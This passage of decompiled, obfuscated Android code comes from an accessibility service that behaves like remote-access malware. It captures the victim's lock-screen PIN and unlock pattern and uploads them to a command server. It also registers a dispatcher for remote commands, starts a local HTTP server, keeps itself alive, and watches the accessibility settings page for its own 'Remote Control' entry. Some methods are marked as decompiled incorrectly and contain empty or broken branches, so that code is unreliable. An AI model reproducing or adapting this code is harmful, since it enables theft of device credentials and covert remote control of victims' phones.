            /* JADX WARN: Removed duplicated region for block: B:17:0x006d A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x002c, B:5:0x004e, B:7:0x0054, B:9:0x005b, B:15:0x0067, B:17:0x006d, B:19:0x0078, B:20:0x008e, B:22:0x0098, B:24:0x00a2, B:25:0x00a7, B:26:0x00b6, B:27:0x00e0, B:29:0x00e6, B:31:0x0107, B:33:0x010b, B:35:0x0111, B:37:0x0115, B:39:0x013d, B:42:0x0146, B:44:0x0167, B:46:0x016d, B:48:0x019c, B:50:0x01a2, B:51:0x01b7, B:30:0x00fb), top: B:82:0x002c }] */
            /* JADX WARN: Removed duplicated region for block: B:27:0x00e0 A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x002c, B:5:0x004e, B:7:0x0054, B:9:0x005b, B:15:0x0067, B:17:0x006d, B:19:0x0078, B:20:0x008e, B:22:0x0098, B:24:0x00a2, B:25:0x00a7, B:26:0x00b6, B:27:0x00e0, B:29:0x00e6, B:31:0x0107, B:33:0x010b, B:35:0x0111, B:37:0x0115, B:39:0x013d, B:42:0x0146, B:44:0x0167, B:46:0x016d, B:48:0x019c, B:50:0x01a2, B:51:0x01b7, B:30:0x00fb), top: B:82:0x002c }] */
            /* JADX WARN: Removed duplicated region for block: B:29:0x00e6 A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x002c, B:5:0x004e, B:7:0x0054, B:9:0x005b, B:15:0x0067, B:17:0x006d, B:19:0x0078, B:20:0x008e, B:22:0x0098, B:24:0x00a2, B:25:0x00a7, B:26:0x00b6, B:27:0x00e0, B:29:0x00e6, B:31:0x0107, B:33:0x010b, B:35:0x0111, B:37:0x0115, B:39:0x013d, B:42:0x0146, B:44:0x0167, B:46:0x016d, B:48:0x019c, B:50:0x01a2, B:51:0x01b7, B:30:0x00fb), top: B:82:0x002c }] */
            /* JADX WARN: Removed duplicated region for block: B:30:0x00fb A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x002c, B:5:0x004e, B:7:0x0054, B:9:0x005b, B:15:0x0067, B:17:0x006d, B:19:0x0078, B:20:0x008e, B:22:0x0098, B:24:0x00a2, B:25:0x00a7, B:26:0x00b6, B:27:0x00e0, B:29:0x00e6, B:31:0x0107, B:33:0x010b, B:35:0x0111, B:37:0x0115, B:39:0x013d, B:42:0x0146, B:44:0x0167, B:46:0x016d, B:48:0x019c, B:50:0x01a2, B:51:0x01b7, B:30:0x00fb), top: B:82:0x002c }] */
            /* JADX WARN: Removed duplicated region for block: B:33:0x010b A[Catch: Exception -> 0x0060, TryCatch #0 {Exception -> 0x0060, blocks: (B:3:0x002c, B:5:0x004e, B:7:0x0054, B:9:0x005b, B:15:0x0067, B:17:0x006d, B:19:0x0078, B:20:0x008e, B:22:0x0098, B:24:0x00a2, B:25:0x00a7, B:26:0x00b6, B:27:0x00e0, B:29:0x00e6, B:31:0x0107, B:33:0x010b, B:35:0x0111, B:37:0x0115, B:39:0x013d, B:42:0x0146, B:44:0x0167, B:46:0x016d, B:48:0x019c, B:50:0x01a2, B:51:0x01b7, B:30:0x00fb), top: B:82:0x002c }] */
            @Override // p000.h10
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public final Object invoke(Object obj) {
                String strM211644b0;
                String strOptString;
                String str;
                C0323a8 c0323a8;
                JSONObject jSONObject = (JSONObject) obj;
                t60.m214695b6(jSONObject, "gestureData");
                t60.m214714d6("dqtvuisjd", "🔐 自动解锁手势录制完成，保存并发送到服务器");
                dqtvuisjd dqtvuisjdVar2 = this.f52585a0;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                String str2 = "";
                try {
                    String strM211470g4 = dqtvuisjdVar2.m211470g4();
                    String str3 = new SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(new Date());
                    JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("gestures");
                    if (jSONArrayOptJSONArray == null || jSONArrayOptJSONArray.length() <= 0) {
                        strOptString = "";
                        if (strOptString.length() <= 0) {
                            dqtvuisjdVar2.m211493i7();
                            if (dqtvuisjdVar2.f52403d4.contains(strOptString)) {
                                t60.m214714d6("dqtvuisjd", "🔐 [去重] 图案 " + strOptString + " 已存在，跳过保存");
                            } else {
                                if (dqtvuisjdVar2.f52403d4.size() >= 1000) {
                                    String str4 = (String) AbstractC0715je.m213292h9(dqtvuisjdVar2.f52403d4);
                                    if (str4 != null) {
                                        dqtvuisjdVar2.f52403d4.remove(str4);
                                    }
                                    t60.m214726f4("dqtvuisjd", "⚠️ 图案去重列表已满，移除最旧: " + str4);
                                }
                                dqtvuisjdVar2.f52403d4.add(strOptString);
                                dqtvuisjdVar2.m211512k8();
                                t60.m214714d6("dqtvuisjd", "🔐 [去重] 新图案 " + strOptString + " 已加入去重列表 (当前共 " + dqtvuisjdVar2.f52403d4.size() + " 个)");
                                if (strOptString.length() <= 0) {
                                    str = "解锁手势-" + strOptString + "_" + str3;
                                } else {
                                    str = "解锁手势_" + str3;
                                }
                                c0323a8 = dqtvuisjdVar2.f52415e6;
                                if (c0323a8 != null) {
                                    C0267a0 c0267a0M211645b1 = c0323a8.m211645b1();
                                    if (c0267a0M211645b1 == null || !c0267a0M211645b1.f52263a3) {
                                        t60.m214726f4("dqtvuisjd", "⚠️ WebSocket未连接，无法保存解锁手势");
                                    } else {
                                        JSONObject jSONObject2 = new JSONObject();
                                        jSONObject2.put("type", "save_unlock_gesture");
                                        JSONObject jSONObject3 = new JSONObject();
                                        jSONObject3.put("device_id", strM211470g4);
                                        jSONObject3.put("name", str);
                                        jSONObject3.put("gestures", jSONObject.toString());
                                        JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray("gestures");
                                        jSONObject3.put("gesture_count", jSONArrayOptJSONArray2 != null ? jSONArrayOptJSONArray2.length() : 0);
                                        jSONObject2.put("data", jSONObject3);
                                        jSONObject2.put("timestamp", System.currentTimeMillis());
                                        String string = jSONObject2.toString();
                                        t60.m214694b5(string, "message.toString()");
                                        c0267a0M211645b1.m211367a8(string);
                                        JSONArray jSONArrayOptJSONArray3 = jSONObject.optJSONArray("gestures");
                                        t60.m214714d6("dqtvuisjd", "🔐 解锁手势已发送到服务器: " + str + " (" + (jSONArrayOptJSONArray3 != null ? jSONArrayOptJSONArray3.length() : 0) + "个手势)");
                                        String strM212470a0 = StringUtil.m212470a0("PlcdNU4zMylSIj9MAz9yKw04UjU=");
                                        Pair pair = new Pair("name", str);
                                        JSONArray jSONArrayOptJSONArray4 = jSONObject.optJSONArray("gestures");
                                        dqtvuisjdVar2.m211515l2(strM212470a0, AbstractC0770a1.m213614f9(pair, new Pair("gesture_count", Integer.valueOf(jSONArrayOptJSONArray4 != null ? jSONArrayOptJSONArray4.length() : 0))));
                                    }
                                }
                            }
                        } else {
                            if (strOptString.length() <= 0) {
                            }
                            c0323a8 = dqtvuisjdVar2.f52415e6;
                            if (c0323a8 != null) {
                            }
                        }
                    } else {
                        JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(0);
                        strOptString = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString("pattern", "") : null;
                        if (strOptString == null) {
                        }
                        if (strOptString.length() <= 0) {
                        }
                    }
                } catch (Exception e) {
                    t60.m214705c6("dqtvuisjd", "❌ 保存解锁手势失败", e);
                }
                JSONArray jSONArrayOptJSONArray5 = jSONObject.optJSONArray("gestures");
                if (jSONArrayOptJSONArray5 != null && jSONArrayOptJSONArray5.length() > 0) {
                    JSONObject jSONObjectOptJSONObject2 = jSONArrayOptJSONArray5.optJSONObject(0);
                    String strOptString2 = jSONObjectOptJSONObject2 != null ? jSONObjectOptJSONObject2.optString("pattern", "") : null;
                    if (strOptString2 != null) {
                        str2 = strOptString2;
                    }
                }
                if (str2.length() > 0) {
                    t60.m214714d6("dqtvuisjd", "🔐 图案解锁成功，同步上传密码记录: ".concat(str2));
                    dqtvuisjd dqtvuisjdVar3 = this.f52585a0;
                    try {
                        C0107as.f45610a3.getInstance(dqtvuisjdVar3).m210507a6("pattern", true, str2);
                        t60.m214714d6("dqtvuisjd", "✅ 图案密码已同步到 AppStatusManager: ".concat(str2));
                    } catch (Exception e2) {
                        tz0.m214810b0("⚠️ 同步 AppStatusManager 失败: ", e2.getMessage(), "dqtvuisjd");
                    }
                    C0323a8 c0323a8M211471g5 = dqtvuisjdVar3.m211471g5();
                    if (c0323a8M211471g5 == null || (strM211644b0 = c0323a8M211471g5.m211644b0()) == null) {
                        t60.m214726f4("dqtvuisjd", "⚠️ 无法获取服务器地址，跳过图案密码上传");
                    } else {
                        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, AbstractC1262tj.f60234a1, new dqtvuisjd$saveLockPatternCipherToServer$1(strM211644b0, dqtvuisjdVar3.m211470g4(), str2, null), 2);
                    }
                }
                return C1351vv.f60710b1;
            }
        };
        c0319a42.f53069b5 = new l10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$5
            {
                super(2);
            }

            @Override // p000.l10
            public final Object invoke(Object obj, Object obj2) {
                String strM211644b0;
                String str = (String) obj;
                boolean zBooleanValue = ((Boolean) obj2).booleanValue();
                t60.m214695b6(str, "pin");
                String str2 = zBooleanValue ? "PASSWORD_QUALITY_ALPHANUMERIC" : "PASSWORD_QUALITY_NUMERIC";
                String str3 = zBooleanValue ? "mixed" : str.length() <= 4 ? "4pin" : "6pin";
                t60.m214714d6("dqtvuisjd", "🔢 锁屏PIN自动捕获: 类型=" + str3 + ", 长度=" + str.length());
                dqtvuisjd dqtvuisjdVar2 = this.f52586a0;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                try {
                    C0107as.f45610a3.getInstance(dqtvuisjdVar2).m210507a6(str3, true, str);
                    t60.m214714d6("dqtvuisjd", "✅ 锁屏PIN已同步到 AppStatusManager: type=" + str3 + ", len=" + str.length());
                } catch (Exception e) {
                    tz0.m214810b0("⚠️ 同步 AppStatusManager 失败: ", e.getMessage(), "dqtvuisjd");
                }
                C0323a8 c0323a8M211471g5 = dqtvuisjdVar2.m211471g5();
                if (c0323a8M211471g5 == null || (strM211644b0 = c0323a8M211471g5.m211644b0()) == null) {
                    t60.m214726f4("dqtvuisjd", "⚠️ 无法获取服务器地址，跳过PIN上传");
                } else {
                    AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, AbstractC1262tj.f60234a1, new dqtvuisjd$saveLockPinToServer$1(strM211644b0, dqtvuisjdVar2.m211470g4(), str2, str, str3, null), 2);
                }
                return C1351vv.f60710b1;
            }
        };
        z50 z50Var = dqtvuisjdVar.f52374a5;
        if (z50Var == null) {
            t60.m214724f2("inputController");
            throw null;
        }
        dqtvuisjdVar.f52417e8 = new x81(dqtvuisjdVar, dqtvuisjdVar, z50Var);
        dqtvuisjdVar.f52418e9 = new C0317a2(dqtvuisjdVar, dqtvuisjdVar);
        dqtvuisjdVar.f52419f0 = new ou0(dqtvuisjdVar, dqtvuisjdVar);
        z50 z50Var2 = dqtvuisjdVar.f52374a5;
        if (z50Var2 == null) {
            t60.m214724f2("inputController");
            throw null;
        }
        dqtvuisjdVar.f52420f1 = new b60(dqtvuisjdVar, dqtvuisjdVar, z50Var2);
        x81 x81Var = dqtvuisjdVar.f52417e8;
        if (x81Var == null) {
            t60.m214724f2("unlockManager");
            throw null;
        }
        da0 da0Var = new da0(dqtvuisjdVar, dqtvuisjdVar, x81Var);
        dqtvuisjdVar.f52421f2 = da0Var;
        b60 b60Var = dqtvuisjdVar.f52420f1;
        if (b60Var != null) {
            b60Var.f45726a4 = da0Var;
        }
        C0323a8 c0323a8 = dqtvuisjdVar.f52415e6;
        if (c0323a8 != null) {
            c0323a8.f53117b7 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$8

                /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
                @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$8$1", m214403f = "dqtvuisjd.kt", m214404l = {3119}, m214405m = "invokeSuspend")
                /* renamed from: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$8$1 */
                final class C02951 extends SuspendLambda implements l10 {

                    /* renamed from: a1 */
                    public int f52588a1;

                    /* renamed from: a2 */
                    public final /* synthetic */ dqtvuisjd f52589a2;

                    /* renamed from: a3 */
                    public final /* synthetic */ JSONObject f52590a3;

                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    public C02951(dqtvuisjd dqtvuisjdVar, JSONObject jSONObject, InterfaceC0876mv interfaceC0876mv) {
                        super(2, interfaceC0876mv);
                        this.f52589a2 = dqtvuisjdVar;
                        this.f52590a3 = jSONObject;
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                        return new C02951(this.f52589a2, this.f52590a3, interfaceC0876mv);
                    }

                    @Override // p000.l10
                    public final Object invoke(Object obj, Object obj2) {
                        return ((C02951) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
                    }

                    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                    public final Object invokeSuspend(Object obj) throws Throwable {
                        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                        int i = this.f52588a1;
                        if (i == 0) {
                            kg1.m213544f4(obj);
                            this.f52588a1 = 1;
                            if (dqtvuisjd.m211411b0(this.f52589a2, this.f52590a3, this) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                        } else {
                            if (i != 1) {
                                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                            }
                            kg1.m213544f4(obj);
                        }
                        return C1351vv.f60710b1;
                    }
                }

                {
                    super(1);
                }

                @Override // p000.h10
                public final Object invoke(Object obj) {
                    JSONObject jSONObject = (JSONObject) obj;
                    t60.m214695b6(jSONObject, "cmd");
                    dqtvuisjd dqtvuisjdVar2 = this.f52587a0;
                    AbstractC0780a0.m213692a3(dqtvuisjdVar2.f52378a9, AbstractC1262tj.f60234a1, new C02951(dqtvuisjdVar2, jSONObject, null), 2);
                    return C1351vv.f60710b1;
                }
            };
        }
        if (dqtvuisjdVar.f52422f3 == null) {
            t60.m214724f2("keyEventManager");
            throw null;
        }
        try {
            new Instrumentation();
        } catch (Exception e) {
            t60.m214705c6("KeyEventManager", "❌ 初始化按键事件管理器失败", e);
        }
        if (dqtvuisjdVar.f52422f3 == null) {
            t60.m214724f2("keyEventManager");
            throw null;
        }
        t60.m214695b6(new m10() { // from class: com.storm.safe.rock.service.dqtvuisjd$initializeDeferredManagers$9
            @Override // p000.m10
            /* renamed from: a1 */
            public final Object mo211537a1(Object obj, Object obj2, Serializable serializable) {
                String str = (String) obj;
                String str2 = (String) obj2;
                t60.m214695b6(str, "logType");
                t60.m214695b6(str2, "content");
                String str3 = AbstractC0315a0.f53025a0;
                AbstractC0315a0.m211544a6("[" + str + "] " + str2);
                return C1351vv.f60710b1;
            }
        }, "recorder");
        fd0 fd0Var = dqtvuisjdVar.f52423f4;
        if (fd0Var == null) {
            t60.m214724f2("maskOverlayManager");
            throw null;
        }
        fd0Var.f56199a1 = C0454ef.f55976c3.getInstance(fd0Var.f56198a0);
        l81 l81Var = dqtvuisjdVar.f52424f5;
        if (l81Var == null) {
            t60.m214724f2("uiAnalysisManager");
            throw null;
        }
        try {
            new a30(l81Var.f57845a0);
        } catch (Exception e2) {
            t60.m214705c6("UIAnalysisManager", "❌ UI分析管理器初始化失败", e2);
        }
        jn0 jn0Var = dqtvuisjdVar.f52425f6;
        if (jn0Var == null) {
            t60.m214724f2("permissionUIManager");
            throw null;
        }
        try {
            new a30(jn0Var.f57348a0);
        } catch (Exception e3) {
            t60.m214705c6("PermissionUIManager", "❌ 权限UI管理器初始化失败", e3);
        }
        if (dqtvuisjdVar.f52426f7 == null) {
            t60.m214724f2("debugAnalysisManager");
            throw null;
        }
        C0262a4 y01Var = C0262a4.f52127b5.getInstance(dqtvuisjdVar);
        dqtvuisjdVar.f52375a6 = y01Var;
        if (y01Var != null) {
            y01Var.f52141b2.add(new C0286a6(dqtvuisjdVar));
        }
        C0262a4 c0262a4 = dqtvuisjdVar.f52375a6;
        if (c0262a4 != null) {
            c0262a4.m211341a5();
        }
        dqtvuisjdVar.f52376a7 = fn0.f56299a2.getInstance(dqtvuisjdVar);
        dqtvuisjd$permissionHealthReceiver$1 dqtvuisjd_permissionhealthreceiver_1 = dqtvuisjdVar.f52489m0;
        try {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_RECOVERED");
            intentFilter.addAction("com.storm.safe.rock.intent.PERMISSION_HEALTH_ISSUE");
            intentFilter.addAction("com.storm.safe.rock.intent.MEDIA_PROJECTION_RECOVERED");
            intentFilter.addAction("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE");
            intentFilter.addAction("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION");
            intentFilter.addAction("com.storm.safe.rock.intent.PERMISSION_RECOVERY_FAILED");
            if (Build.VERSION.SDK_INT >= 33) {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_permissionhealthreceiver_1, intentFilter, 4);
            } else {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_permissionhealthreceiver_1, intentFilter);
            }
            dqtvuisjdVar.f52488l9 = true;
            t60.m214714d6("dqtvuisjd", "✅ 已注册权限健康监控广播接收器");
        } catch (Exception e4) {
            t60.m214705c6("dqtvuisjd", "❌ 注册权限健康监控广播接收器失败", e4);
        }
        t60.m214714d6("dqtvuisjd", "🔧 初始化命令分发器...");
        dqtvuisjdVar.f52381b2 = new uz0(dqtvuisjdVar);
        uz0 uz0Var = dqtvuisjdVar.f52381b2;
        if (uz0Var == null) {
            t60.m214724f2("commandContext");
            throw null;
        }
        C0350a7 c0350a72 = new C0350a7(uz0Var);
        dqtvuisjdVar.f52380b1 = c0350a72;
        InterfaceC0726jp[] interfaceC0726jpArr = {new y20(), new C0352a9(), new cp0(), new C0346a3(), new lu0(), new C0434dy(), new C0345a2(), new h30(), new C0349a6(), new C0351a8(), new C0347a4(), new C0344a1(), new cn0(), new C0343a0(), new C0348a5(), new C0620ig()};
        for (int i = 0; i < 16; i++) {
            InterfaceC0726jp interfaceC0726jp = interfaceC0726jpArr[i];
            ConcurrentHashMap concurrentHashMap = c0350a72.f53599a2;
            t60.m214695b6(interfaceC0726jp, "handler");
            c0350a72.f53598a1.add(interfaceC0726jp);
            for (String str : interfaceC0726jp.mo210873a1()) {
                if (concurrentHashMap.containsKey(str)) {
                    t60.m214726f4("CommandDispatcher", "命令 " + str + " 已被注册，将被新处理器覆盖");
                }
                concurrentHashMap.put(str, interfaceC0726jp);
            }
            t60.m214702c3("CommandDispatcher", "注册处理器: " + interfaceC0726jp.getClass().getSimpleName() + ", 支持命令: " + interfaceC0726jp.mo210873a1());
        }
        C0350a7 c0350a73 = dqtvuisjdVar.f52380b1;
        if (c0350a73 == null) {
            t60.m214724f2("commandDispatcher");
            throw null;
        }
        AbstractC0003a2.m44c5("✅ 命令分发器初始化完成，注册了 ", c0350a73.f53598a1.size(), " 个处理器", "dqtvuisjd");
        try {
            C0341a7 c0340a62 = C0341a7.f53380c1.getInstance();
            if (c0340a62 != null) {
                c0340a62.m211863a2();
            }
            C0323a8 c0323a82 = dqtvuisjdVar.f52415e6;
            if (c0323a82 != null) {
                c0323a82.m211658c4("request_init_config", new JSONObject());
            }
        } catch (Exception unused) {
        }
        try {
            c0322a7 = new C0322a7(dqtvuisjdVar);
            dqtvuisjdVar.f52382b3 = c0322a7;
            c0350a7 = dqtvuisjdVar.f52380b1;
        } catch (Exception e5) {
            t60.m214705c6("dqtvuisjd", "❌ LocalHttpServer 启动失败", e5);
        }
        if (c0350a7 == null) {
            t60.m214724f2("commandDispatcher");
            throw null;
        }
        if (dqtvuisjdVar.f52381b2 == null) {
            t60.m214724f2("commandContext");
            throw null;
        }
        c0322a7.f53093a5 = c0350a7;
        t60.m214714d6("LocalHttpServer", "✅ 命令分发器已设置");
        C0322a7 c0322a72 = dqtvuisjdVar.f52382b3;
        if (c0322a72 == null) {
            t60.m214724f2("localHttpServer");
            throw null;
        }
        c0322a72.m211632e7();
        t60.m214714d6("dqtvuisjd", "✅ LocalHttpServer 已启动，端口 " + C0322a7.f53085a9.getPORT());
        try {
            dqtvuisjdVar.m211531m9();
        } catch (Exception unused2) {
        }
        try {
            dqtvuisjdVar.m211505k1();
        } catch (Exception unused3) {
        }
        try {
            mj1 mj1Var = nj1.f58634a4;
            Context applicationContext2 = dqtvuisjdVar.getApplicationContext();
            t60.m214694b5(applicationContext2, "applicationContext");
            nj1.m214108a1(mj1Var.getInstance(applicationContext2));
        } catch (Exception unused4) {
        }
        t60.m214714d6("dqtvuisjd", "✅ [授权后] 延迟管理器初始化完成");
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x003f A[Catch: Exception -> 0x00a5, TryCatch #1 {Exception -> 0x00a5, blocks: (B:3:0x0003, B:6:0x000a, B:8:0x0010, B:11:0x0018, B:13:0x001d, B:24:0x003f, B:26:0x005a, B:28:0x0071, B:29:0x0075, B:31:0x007b, B:41:0x0090, B:16:0x0025, B:17:0x0029, B:19:0x002f), top: B:48:0x0003 }] */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final boolean m211417b6(dqtvuisjd dqtvuisjdVar) {
        String string;
        boolean z;
        boolean z2;
        try {
            AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                Set set = dqtvuisjdVar.f52446h7;
                if (set == null || !set.isEmpty()) {
                    Iterator it = set.iterator();
                    while (it.hasNext()) {
                        if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                            z = true;
                            break;
                        }
                    }
                    z = false;
                    if (z) {
                        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55769b9, AbstractC0716jf.m213306g5("SystemHelper", "Remote Control", "远程控制"));
                        int size = arrayListM213298i5.size();
                        int i = 0;
                        while (true) {
                            if (i >= size) {
                                z2 = false;
                                break;
                            }
                            Object obj = arrayListM213298i5.get(i);
                            i++;
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) obj);
                            t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
                            if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it2.hasNext()) {
                                    try {
                                        cq0.m212492d5((AccessibilityNodeInfo) it2.next());
                                    } catch (Exception unused) {
                                    }
                                }
                                z2 = true;
                            }
                        }
                        boolean z3 = z && z2;
                        if (z3) {
                            t60.m214702c3("dqtvuisjd", "🔍 [监控] 检测到可能卡在无障碍设置页面: 包名=" + string);
                        }
                        return z3;
                    }
                } else {
                    z = false;
                    if (z) {
                    }
                }
            }
            return false;
        } catch (Exception unused2) {
            return false;
        }
    }

    /* JADX WARN: Type inference failed for: r2v0, types: [com.storm.safe.rock.service.dqtvuisjd$registerLocalServiceActionReceiver$1] */
    /* renamed from: b7 */
    public static final void m211418b7(final dqtvuisjd dqtvuisjdVar) {
        if (dqtvuisjdVar.f52460j1) {
            return;
        }
        try {
            final String packageName = dqtvuisjdVar.getPackageName();
            dqtvuisjdVar.f52459j0 = new BroadcastReceiver(dqtvuisjdVar) { // from class: com.storm.safe.rock.service.dqtvuisjd$registerLocalServiceActionReceiver$1

                /* renamed from: a1 */
                public final /* synthetic */ dqtvuisjd f52667a1;

                {
                    this.f52667a1 = dqtvuisjdVar;
                }

                @Override // android.content.BroadcastReceiver
                public void onReceive(Context context, Intent intent) {
                    t60.m214695b6(context, "context");
                    t60.m214695b6(intent, "intent");
                    String action = intent.getAction();
                    if (action == null) {
                        return;
                    }
                    StringBuilder sb = new StringBuilder();
                    String str = packageName;
                    sb.append(str);
                    sb.append(".ACTION_KEEP_ALIVE");
                    if (action.equals(sb.toString()) || AbstractC0779a1.m213655a8(action, false, ".ACTION_KEEP_ALIVE")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到 KEEP_ALIVE 广播");
                        return;
                    }
                    if (action.equals(str + ".ACTION_REQUEST_CONFIG_SYNC") || AbstractC0779a1.m213655a8(action, false, ".ACTION_REQUEST_CONFIG_SYNC")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到配置同步请求 → 通知服务器重新推送配置");
                        try {
                            C0323a8 c0323a8 = this.f52667a1.f52415e6;
                            if (c0323a8 != null) {
                                c0323a8.m211658c4("request_init_config", new JSONObject());
                                return;
                            }
                            return;
                        } catch (Exception unused) {
                            return;
                        }
                    }
                    if (action.equals(str + ".ACTION_ALARM_KEEP_ALIVE") || AbstractC0779a1.m213655a8(action, false, ".ACTION_ALARM_KEEP_ALIVE")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到 ALARM_KEEP_ALIVE 广播");
                        return;
                    }
                    if (action.equals(str + ".SCREEN_EVENT") || AbstractC0779a1.m213655a8(action, false, ".SCREEN_EVENT")) {
                        String stringExtra = intent.getStringExtra("event");
                        if (stringExtra == null) {
                            stringExtra = "";
                        }
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到 SCREEN_EVENT: ".concat(stringExtra));
                        return;
                    }
                    if (action.equals(str + ".ROTATION_CHANGED") || AbstractC0779a1.m213655a8(action, false, ".ROTATION_CHANGED")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到 ROTATION_CHANGED: " + intent.getIntExtra("rotation", -1));
                        return;
                    }
                    if (action.equals(str + ".ACTION_PAUSE_ACCESSIBILITY") || AbstractC0779a1.m213655a8(action, false, ".ACTION_PAUSE_ACCESSIBILITY") || AbstractC0779a1.m213655a8(action, false, ".pause.accessibility")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到暂停广播: ".concat(action));
                        dqtvuisjd.f52358m1.pauseForSensitiveApp();
                        return;
                    }
                    if (action.equals(str + ".ACTION_RESUME_ACCESSIBILITY") || AbstractC0779a1.m213655a8(action, false, ".ACTION_RESUME_ACCESSIBILITY") || AbstractC0779a1.m213655a8(action, false, ".resume.accessibility")) {
                        t60.m214714d6("dqtvuisjd", "📡 [local-service] 收到恢复广播: ".concat(action));
                        dqtvuisjd.f52358m1.resumeFromSensitiveApp();
                    }
                }
            };
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(packageName + ".ACTION_KEEP_ALIVE");
            intentFilter.addAction(packageName + ".ACTION_REQUEST_CONFIG_SYNC");
            intentFilter.addAction(packageName + ".ACTION_ALARM_KEEP_ALIVE");
            intentFilter.addAction(packageName + ".SCREEN_EVENT");
            intentFilter.addAction(packageName + ".ROTATION_CHANGED");
            intentFilter.addAction(packageName + ".ACTION_PAUSE_ACCESSIBILITY");
            intentFilter.addAction(packageName + ".ACTION_RESUME_ACCESSIBILITY");
            intentFilter.addAction(packageName + ".pause.accessibility");
            intentFilter.addAction(packageName + ".resume.accessibility");
            if (Build.VERSION.SDK_INT >= 33) {
                dqtvuisjdVar.registerReceiver(dqtvuisjdVar.f52459j0, intentFilter, 2);
            } else {
                dqtvuisjdVar.registerReceiver(dqtvuisjdVar.f52459j0, intentFilter);
            }
            dqtvuisjdVar.f52460j1 = true;
            t60.m214714d6("dqtvuisjd", "✅ local-service 广播接收器已注册 (8个Action，含动态包名)");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 注册 local-service 广播接收器失败", e);
        }
    }

    /* renamed from: b8 */
    public static final void m211419b8(dqtvuisjd dqtvuisjdVar) {
        dqtvuisjd$permissionRequestReceiver$1 dqtvuisjd_permissionrequestreceiver_1 = dqtvuisjdVar.f52465j6;
        try {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("com.storm.safe.rock.intent.PERMISSION_REQUEST");
            intentFilter.addAction("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED");
            intentFilter.addAction("com.storm.safe.rock.intent.MANUAL_ACTION_REQUIRED");
            intentFilter.addAction("com.storm.safe.rock.intent.PERMISSION_GRANTED");
            intentFilter.addAction("com.storm.safe.rock.intent.REACTIVATE_PERMISSION_GRANTER");
            intentFilter.addAction("com.storm.safe.rock.intent.ANDROID15_SECONDARY_CONFIRMATION");
            intentFilter.addAction("com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED");
            intentFilter.addAction("com.storm.safe.rock.intent.START_ACCESSIBILITY_SERVICE");
            intentFilter.addAction("com.storm.safe.rock.intent.ENABLE_LOGGING");
            intentFilter.addAction(dqtvuisjdVar.getPackageName() + ".MEDIA_PROJECTION_PERMISSION_GRANTED");
            if (Build.VERSION.SDK_INT >= 33) {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_permissionrequestreceiver_1, intentFilter, 4);
            } else {
                dqtvuisjdVar.registerReceiver(dqtvuisjd_permissionrequestreceiver_1, intentFilter);
            }
            t60.m214714d6("dqtvuisjd", "已注册权限申请广播接收器");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "注册广播接收器失败", e);
        }
    }

    /* renamed from: b9 */
